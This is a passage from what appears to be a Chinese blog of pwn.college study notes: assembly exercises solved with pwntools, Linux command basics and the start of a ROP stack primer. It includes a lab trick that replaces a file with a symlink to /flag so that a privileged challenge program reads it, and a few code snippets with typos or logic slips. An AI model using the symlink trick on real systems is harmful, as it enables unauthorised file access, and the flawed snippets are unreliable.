class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.intel_syntax noprefix<br>.global _start<br>_start:<br>mov rdi, 0<br>mov rsi, 1337000<br>mov rdx, 8<br>mov rax, 0<br>syscall<br>mov rax, 1<br>mov rdi, 1<br>mov rdx, 8<br>mov rsi, 1337000<br>syscall<br>mov rax, 60<br>mov rdi, 42<br>syscall<br></code></pre></td></tr></table></figure><h3 id="Assembly-Crash-Course"><a href="#Assembly-Crash-Course" class="headerlink" title="Assembly Crash Course"></a>Assembly Crash Course</h3><p>1.set-register</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/challenge/run<br></code></pre></td></tr></table></figure><p>开始挑战</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>context.arch=&#x27;amd64&#x27;<br>p=process(&#x27;/challenge/run&#x27;)<br>p.recvline()<br>p.send(asm(&#x27;mov rdi,0x1337&#x27;))<br>print(p.readallS())<br></code></pre></td></tr></table></figure><p>2.设置多个寄存器的值</p><p>3.寄存器的数学运算</p><p>4.寄存器的数学运算</p><p>mul[无符号乘法]和imul[有符号乘法]</p><p>5.整数除法向下取整</p><p>div是一个较为复杂的运算操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div reg<br></code></pre></td></tr></table></figure><p>等效于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">rax = rax:rdx / reg<br>rdx = 余数<br></code></pre></td></tr></table></figure><p>其中 rdx表示128位数的高64位 ， rax表示128位数的低64位</p><p>6.取模运算</p><p>7.寄存器的结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">MSB                                    LSB<br>+----------------------------------------+<br>|                   rax                  |<br>+--------------------+-------------------+<br>                     |        eax        |<br>                     +---------+---------+<br>                               |   ax    |<br>                               +----+----+<br>                               | ah | al |<br>                               +----+----+<br></code></pre></td></tr></table></figure><ol start="8"><li></li></ol><p>小技巧：</p><p><strong>当除数是2的n次方时，余数就是被除数的低n位</strong></p><p>错误示范：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context.arch = &#x27;amd64&#x27;<br>p = process(&#x27;/challenge/run&#x27;)<br><br>sleep(0.5)<br><br>p.send(asm(&#x27;&#x27;&#x27;<br>    mov rax, al<br>    mov rbx, ax<br>           &#x27;&#x27;&#x27;))<br><br>print(p.recvallS())<br></code></pre></td></tr></table></figure><p>报错虽然报一些不太相干的原因，但是可能就是pwn.college上的模块不支持这种操作</p><p>正确解答：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>context.arch=&#x27;amd64&#x27;<br> <br>p=process(&#x27;/challenge/run&#x27;)<br>p.recvline()<br>p.send(asm(&#x27;&#x27;&#x27;<br>    mov al, dil<br>    mov bx, si<br>    &#x27;&#x27;&#x27;.strip()))<br>print(p.recvallS())<br></code></pre></td></tr></table></figure><ol start="9"><li></li></ol><p>shl  左移动位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl al, 1<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">rax: 10001010<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">rax: 00010100#修改后<br></code></pre></td></tr></table></figure><p>位移操作的一个好处是可以快速实现乘法（乘以 2）或除法（除以 2），还可以用于计算取模。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shr reg1, reg2<br></code></pre></td></tr></table></figure><p>将reg1向右移动reg2 中指定的位数</p><p>在代码后加上.strip()避免不必要的错误</p><ol start="10"><li></li></ol><p>位与操作：两个值都为1才是1，否则为0</p><p>我觉得有点奇怪</p><p>按照题目的意思可以以rax为中间寄存器去操作存储and rdi rsi 的值</p><p>也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and rax, rsi<br>and rax, rdi<br></code></pre></td></tr></table></figure><p>题目的意思貌似就是这样rax的值就是rsi和rdi的与操作的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and rsi, rdi<br>mov rax, rsi <br></code></pre></td></tr></table></figure><p><strong>个人觉得题目可能有些问题，我觉得成立情况应该是rax为2的n次方减一才能对这些寄存器实现</strong></p><p>这里我还参考了别人的博客：<strong><a href="https://blog.inullstudio.top/2023/09/01/assembly-crash-course/">Assembly Crash Course-pwn.college（持续更新） - 零夜blog</a></strong></p><p>其中level10就是这题，他给的题解是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>context.arch=&#x27;amd64&#x27;<br> <br>p=process(&#x27;/challenge/run&#x27;)<br>p.recvline()<br>p.send(asm(&#x27;&#x27;&#x27;<br>    and rdi, rsi<br>    xor rax, rax<br>    or rax, rdi<br>    &#x27;&#x27;&#x27;))<br>print(p.recvallS())<br></code></pre></td></tr></table></figure><p>xor清空了rax，所以rax的所有位都是0，这时候or rax， rdi其实就等效于mov rax，rdi</p><p>所以也可以看出这两段代码效果是相同的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor rax, rax<br>or rax, rdi<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax, rdi<br></code></pre></td></tr></table></figure><p>这样比题目给的更符合逻辑</p><ol start="11"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context.arch = &#x27;amd64&#x27;<br>p = process(&#x27;/challenge/run&#x27;)<br><br>p.send(asm(&#x27;&#x27;&#x27;<br>        xor rax, rax<br>        or rax, 1<br>        and rdi, 1<br>        xor rax, rdi<br>           &#x27;&#x27;&#x27;.strip()))<br><br>sleep(0.5)<br><br>print(p.recvallS())<br></code></pre></td></tr></table></figure><ol start="12"><li></li></ol><p>内存地址的访问和设定</p><ol start="13"><li></li></ol><p>将寄存器中的值写入线性地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov [0x404000], rax   ; 将 rax 中的值存储到内存地址 0x404000 处<br></code></pre></td></tr></table></figure><p>注意，不要理解成将rax中的值存储到内存地址0x404000所存储的地址的位置中</p><ol start="14"><li></li></ol><p>错误示范：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context.arch = &#x27;amd64&#x27;<br>p = process(&#x27;/challenge/run&#x27;)<br><br>p.send(asm(&#x27;&#x27;&#x27;<br>        mov rax, [0x404000]<br>        add [0x404000], 0x1337<br>           &#x27;&#x27;&#x27;.strip()))<br><br>sleep(0.5)<br><br>print(p.recvallS())<br></code></pre></td></tr></table></figure><p>注意，地址里的值不能用立即数赋值，可以通过寄存器赋值</p><p>正确示范：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python3">rom pwn import *<br><br>context.arch = &#x27;amd64&#x27;<br>p = process(&#x27;/challenge/run&#x27;)<br><br>p.send(asm(&#x27;&#x27;&#x27;<br>        mov rax, [0x404000]<br>        add rbx, [0x404000]<br>        add rbx, 0x1337<br>        mov [0x404000], rbx<br>           &#x27;&#x27;&#x27;.strip()))<br><br>sleep(0.5)<br><br>print(p.recvallS())<br></code></pre></td></tr></table></figure><ol start="15"><li></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">双字（Quad Word）= 8 字节 = 64 位<br>双字（Double Word）= 4 字节 = 32 位<br>字（Word）= 2 字节 = 16 位<br>字节（Byte）= 1 字节 = 8 位<br></code></pre></td></tr></table></figure><p>在进行类似如下这种操作时，不会清空寄存器的高位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al， [0x404000]<br></code></pre></td></tr></table></figure><ol start="16"><li></li></ol><p>同上操作，但是增加了16位，32位，64位</p><ol start="17"><li></li></ol><p>**小端序：**存储数据的情况和我们看到的实际上是相反的</p><p>但是这个题目和大小端序没什么关系，就是给地址送值，但是需要注意，给地址送入比较大的值时，不能直接进行操作，而是要通过寄存器来协助，具体原因如下</p><ol><li><strong>指令集限制</strong></li></ol><ul><li>x86 汇编指令集的设计中，直接将一个较大的常量（例如 64 位常量）写入内存地址的操作可能会受到指令长度和编码的限制。</li><li>汇编指令的编码空间有限，直接将一个大常量写入内存可能需要额外的指令来实现，而不是一条简单的指令。</li></ul><ol start="2"><li><strong>操作数大小限制</strong></li></ol><ul><li>x86 架构支持多种操作数大小（如 8 位、16 位、32 位和 64 位）。直接将一个大常量写入内存时，需要明确操作数的大小。</li><li>如果直接使用类似 <code>mov [rdi], 0xdeadbeef00001337</code> 的指令，可能会导致指令过长或无法正确解析。</li></ul><ol start="3"><li><strong>寄存器间接寻址的限制</strong></li></ol><ul><li>在 x86 架构中，寄存器间接寻址（如 <code>[rdi]</code>）通常用于访问内存，但直接将一个大常量赋值给内存地址可能需要先将常量加载到寄存器中，然后再通过寄存器间接寻址写入内存。</li></ul><ol start="18"><li></li></ol><p>连续读取内存</p><p>这里有一个小技巧，题目要求我们除以4，实际上可以shr rax，2来做到同样的效果</p><ol start="19"><li></li></ol><p>介绍栈及其特性(FILO)</p><ol start="20"><li></li></ol><p>通过栈交换寄存器的值</p><ol start="21"><li></li></ol><p>通过栈顶指针esp读取写入内存</p><ol start="22"><li></li></ol><p>跳转学习</p><p>对于所有跳转，有三种类型：</p><ul><li><strong>相对跳转</strong>：相对于下一条指令向前或向后跳转。</li><li><strong>绝对跳转</strong>：跳转到一个特定的地址。</li><li><strong>间接跳转</strong>：跳转到寄存器中指定的内存地址。</li></ul><p>这一关是绝对跳转jmp reg</p><ol start="23"><li></li></ol><p>相对跳转</p><p>这里还介绍了一种便于重复的汇编指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.rept num<br>assembly<br>.endr<br></code></pre></td></tr></table></figure><p>重复num遍assembly的指令</p><p>jmp sign</p><p>跳转到标签sign处</p><ol start="24"><li></li></ol><p>绝对跳转和相对跳转交换使用</p><ol start="25"><li></li></ol><p>条件跳转</p><p>x86 中有许多跳转类型，学习它们的使用方法会很有帮助。几乎所有跳转指令都依赖于一个叫做 ZF（Zero Flag，零标志位）的东西。当 <code>cmp</code> 的结果相等时，ZF 被设置为 1，否则为 0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp reg ,some_values<br>je sign<br></code></pre></td></tr></table></figure><p>如果 reg 和 some_values 相等，ZF标志位则会设置为1，否则为0，而ZF标志位设置为1，则可进行后续的条件跳转，否则不进行</p><ol start="26"><li></li></ol><p>间接跳转：</p><p>地址表，减少cmp的使用</p><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context.arch = &#x27;amd64&#x27;<br>p = process(&#x27;/challenge/run&#x27;)<br><br>p.send(asm(&#x27;&#x27;&#x27;<br>cmp rdi, 4<br>jae default<br>jmp [rsi + rdi * 8]<br>jmp end<br>default:<br>jmp [rsi + 4 * 8]<br>end:<br>nop<br>           &#x27;&#x27;&#x27;.strip()))<br>sleep(0.5)<br><br>print(p.recvallS())<br></code></pre></td></tr></table></figure><ol start="27"><li></li></ol><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context.arch = &#x27;amd64&#x27;<br>p = process(&#x27;/challenge/run&#x27;)<br><br>p.send(asm(&#x27;&#x27;&#x27;<br>           mov rax, 0x00<br>           mov rbx, 0x00<br>           mov rcx, 0x00<br>           mov rdx, 0x00<br>           start:<br>           cmp rax, rsi<br>           je end<br>           add rbx, [rdi + 8 * rax]<br>           add rax, 0x01<br>           jmp start<br>           end:<br>           mov rax, rbx<br>           div rsi<br>           &#x27;&#x27;&#x27;.strip()))<br>sleep(0.5)<br><br>print(p.recvallS())<br></code></pre></td></tr></table></figure><ol start="28"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context.arch = &#x27;amd64&#x27;<br>p = process(&#x27;/challenge/run&#x27;)<br><br>p.send(asm(&#x27;&#x27;&#x27;<br>           mov rax, 0x00<br>           mov rbx, 0x00<br>           mov rcx, 0x00<br>           mov rdx, 0x00<br>           start:<br>           cmp rdi, rdx<br>           je end<br>           cmp [rdi + rax], rbx<br>           je end<br>           add rax, 0x01<br>           jmp start<br>           end:<br>           nop<br>           &#x27;&#x27;&#x27;.strip()))<br>sleep(0.5)<br><br>print(p.recvallS())<br></code></pre></td></tr></table></figure><ol start="29"><li></li></ol><p>call指令和ret指令：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>pwn.college</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux Luminarium</title>
    <link href="/Linux%20Luminarium/"/>
    <url>/Linux%20Luminarium/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-Luminarium"><a href="#Linux-Luminarium" class="headerlink" title="Linux Luminarium"></a>Linux Luminarium</h1><h3 id="Hello-Hackers"><a href="#Hello-Hackers" class="headerlink" title="Hello Hackers"></a>Hello Hackers</h3><p>1.介绍了whoami命令，输出当前用户名称</p><p>2.然后通过简单的示例介绍了如何使用命令的arguements</p><h3 id="Pondering-Paths"><a href="#Pondering-Paths" class="headerlink" title="Pondering Paths"></a>Pondering Paths</h3><p>1.了解&#x2F;代表root，也就是根目录</p><p>2.了解什么是绝对路径</p><p>3.了解cd命令，change directory</p><p>4.同上</p><p>5.同上</p><p>6.相对路径以及..的含义，也就是上级目录</p><p>7.‘.’ 代表当前目录</p><p>8.用.&#x2F;来表示运行程序</p><p>9.~代表用户目录</p><h3 id="Comprehending-Commands"><a href="#Comprehending-Commands" class="headerlink" title="Comprehending Commands"></a>Comprehending Commands</h3><p>1.cat命令</p><p>4.grep命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ grep SEARCH_STRING /path/to/file<br></code></pre></td></tr></table></figure><p>5.ls命令，就是列出文件和文件夹</p><p>6.touch创建文件</p><p>7.rm删除文件</p><p>8.ls -a 显示隐藏文件</p><p>9.组合使用</p><p>10.mkdir创建文件夹</p><p>11.find命令</p><p>12.创建软链接[符号链接]和硬链接</p><p>硬链接是一个代替地址，它指向这些数据，通过硬链接访问与直接访问无异</p><p>而软链接在Linux执行时会意识到这是一个软链接,读取文件**名称,**然后通常自动访问该文件,大多数情况下，两种情况都能访问原始数据，但是方式不同</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ ln -s /tmp/myfile /home/hacker/ourfile <br></code></pre></td></tr></table></figure><p>上述过程创造ourfile指向 myfile</p><p>file命令可以监测软连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ file ~/ourfile  <br>/home/hacker/ourfile: symbolic link to /tmp/myfile<br></code></pre></td></tr></table></figure><p>原文的题目含义如下：</p><p>好的，现在轮到你来尝试了！在这个关卡中，标志（flag）一如既往地位于 <code>/flag</code>，但 <code>/challenge/catflag</code> 会输出 <code>/home/hacker/not-the-flag</code> 的内容。使用符号链接，欺骗它，让它给你标志！</p><p>这个时候我们可以把not-the-flag删除，然后创建相同名字的软连接指向&#x2F;flag</p><p>然后就可以通过有读权限的软链接读取内容</p><p>大致思路如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ rm /home/hacker/not-the-flag<br>hacker@dojo:~$ ln -s /flag /home/hacker/not-the-flag<br></code></pre></td></tr></table></figure><h3 id="Digesting-Documentation"><a href="#Digesting-Documentation" class="headerlink" title="Digesting Documentation"></a>Digesting Documentation</h3><p>1.ls -a</p><p>2.更复杂的方式熟悉联系</p><p>3.man命令，manual的简称,作用就是查询命令相关信息,退出查询输入q</p><p>4.说明书的阅读便捷指令</p><p>5.man man操作</p><p>6.–help选项，并不是所有的命令都有man</p><p>7.help</p><h3 id="File-Globbing"><a href="#File-Globbing" class="headerlink" title="File Globbing"></a>File Globbing</h3><p>1.*代表任何字符，可以代表多个</p><p>2.?也代表任何字符，不过只代表一个</p><p>3.通配符[ab]只筛选在其中的</p><p>4.用[]通配符寻找路径</p><p>5.综合使用</p><p>6.[]中加上了！或者^含义是不需要找列出的字符的通配符</p><h3 id="Practicing-Piping"><a href="#Practicing-Piping" class="headerlink" title="Practicing Piping"></a>Practicing Piping</h3><p>1.重定向输出 &gt;</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ echo hi &gt; asdf<br></code></pre></td></tr></table></figure><p>2.命令输出的重定向</p><p>3.&gt;总是回创造一个新的重定向输出文件，同时删除内容，&gt;&gt;可以追加重定向</p><p>4.文件描述符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">FD 0:标准输入#默认指向键盘输入<br>FD 1:标准输出#和正常情况相同<br>FD 2:标准错误#输入错误信息<br></code></pre></td></tr></table></figure><p>5.重定向输入 &lt;</p><p>6.grep</p><p>7.grep实时输出的信息   |</p><p>8.grep标准错误信息</p><p>9.&gt;&amp;操作符，将一个文件描述符重定向给另一个文件描述符</p><p>10.tee，T型分叉器，可以将管道上的数据复制到命令行上的任意数量的文件中去</p><p>11.tee的更多用法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ echo HACK | tee THE &gt; PLANET#将数据复制到两个文件中<br>hacker@dojo:~$ echo HACK | tee THE | cat#将数据复制到文件和命令<br></code></pre></td></tr></table></figure><p>进程替换</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ echo &gt;(rev)<br>/dev/fd/63<br>hacker@dojo:~$<br></code></pre></td></tr></table></figure><p>写入一个参数</p><p>会将其输入连接到一个临时文件（它会创建）</p><p>这不是一个真正的文件，它被称为<strong>命名管道</strong>，因为他有一个文件名</p><p>随后bash会把命名管道文件的路径连接到rev</p><p>示例及其过程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ echo HACK | rev<br>KCAH<br>hacker@dojo:~$ echo HACK | tee &gt;(rev)<br>HACK<br>KCAH<br></code></pre></td></tr></table></figure><ol><li>bash 启动了 <code>rev</code> 命令，并将一个命名管道（可能是 <code>/dev/fd/63</code>）连接到 <code>rev</code> 的标准输入。</li><li>bash 启动了 <code>tee</code> 命令，将管道连接到它的标准输入，并将 <code>tee</code> 的第一个参数替换为 <code>/dev/fd/63</code>。<code>tee</code> 甚至没有看到参数 <code>&gt;(rev)</code>； shell 在启动 <code>tee</code> 之前已经替换了它。</li><li>bash 使用 <code>echo</code> 内置命令将 <code>HACK</code> 写入 <code>tee</code> 的标准输入。</li><li><code>tee</code> 读取了 <code>HACK</code>，将其写入标准输出，然后写入 <code>/dev/fd/63</code>（它连接到 <code>rev</code> 的标准输入）。</li><li><code>rev</code> 从其标准输入读取 <code>HACK</code>，将其反转，并将 <code>KCAH</code> 写入标准输出。</li></ol><p>12.综合利用</p><h3 id="Shell-Variables"><a href="#Shell-Variables" class="headerlink" title="Shell Variables"></a>Shell Variables</h3><p>1.$变量名，存储在shell的工作目录路径中</p><p>2.也可以用&#x3D;为变量赋值，注意&#x3D;周围不能有空格</p><p>3.空格不能随便使用，复制后使用空格后的部分会被识别为命令</p><p>若要为变量的值赋出含空格的内容可以参考</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ VAR=&quot;1337 SAUCE&quot;<br></code></pre></td></tr></table></figure><p>4.$最小提示符[shell]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ VAR=1337<br>hacker@dojo:~$ echo &quot;VAR is: $VAR&quot;<br>VAR is: 1337<br>hacker@dojo:~$ sh<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;VAR is: <span class="hljs-variable">$VAR</span>&quot;</span></span><br>VAR is: <br></code></pre></td></tr></table></figure><p>5.env命令：打印出你在 Shell 中设置的所有导出变量</p><p>6.命令替换</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ FLAG=$(cat /flag)<br>hacker@dojo:~$ echo &quot;$FLAG&quot;<br>pwn.college&#123;blahblahblah&#125;<br>hacker@dojo:~$<br></code></pre></td></tr></table></figure><p>7.内置read函数读取标准数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@dojo:~$ read -p &quot;INPUT: &quot; MY_VARIABLE<br>INPUT: Hello!<br>hacker@dojo:~$ echo &quot;You entered: $MY_VARIABLE&quot;<br>OUTPUT: You entered: Hello!<br></code></pre></td></tr></table></figure><p>8.综合考察</p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>pwn.college</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROP</title>
    <link href="/ROP/"/>
    <url>/ROP/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>学习路线网址：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a></p><h2 id="C语言函数调用栈的相关知识"><a href="#C语言函数调用栈的相关知识" class="headerlink" title="C语言函数调用栈的相关知识"></a>C语言函数调用栈的相关知识</h2><p><strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p><ul><li><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C 语言函数调用栈 (一)</a></li></ul><p>程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈<strong>传递函数参数</strong>、<strong>保存返回地址</strong>、<strong>临时保存寄存器原有值(即函数调用的上下文)<strong>以备恢复以及</strong>存储本地局部变量</strong>。</p><p>不同处理器和编译器的堆栈布局、函数调用方法都可能不同，但堆栈的基本概念是一样的。</p><p><strong>1.寄存器分配</strong></p><p>寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令。因此函数调用栈的实现与处理器寄存器组密切相关。</p><p>Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：</p><p>​<img src="/../00000000/image-20250209105229676.png" alt="image-20250209105229676"></p><p>最初的8086中寄存器是16位，每个都有特殊用途，寄存器名城反映其不同用途。由于<strong>IA32平台采用平面寻址模式</strong>，对特殊寄存器的需求大大降低，但由于历史原因，这些寄存器名称被保留下来。在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。某些指令可能以固定的寄存器作为源寄存器或目的寄存器，如一些特殊的算术操作指令 imull&#x2F;mull&#x2F;cltd&#x2F;idivl&#x2F;divl 要求一个参数必须在 %eax中，其运算结果存放在 %edx(higher 32-bit)和 %eax 